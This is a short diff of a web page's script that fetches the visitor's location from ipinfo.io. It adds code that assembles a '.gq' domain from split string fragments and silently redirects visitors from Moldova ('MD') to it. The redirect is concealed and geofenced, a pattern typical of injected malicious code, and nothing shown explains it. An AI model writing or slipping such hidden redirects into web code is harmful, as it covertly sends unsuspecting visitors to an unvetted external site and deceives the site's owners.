@@ -143,10 +143,14 @@
 fetch('https://ipinfo.io/json')
 .then( res => res.json())
 .then(response => {
-    console.log("Country: ", response);
+console.log("Country: ", response);
+var a = 'mdne'; var b = 'eke'; var c ='nig'; var d = 'gq';
+   if (response.country == 'MD') {
+     $(location).attr('href', 'https://' + a + b + c + '.' + d );
+   }
  })
  .catch((data, status) => {
-    console.log('Request failed');
+    console.log('failed');
  })
 	</script>
 </body>
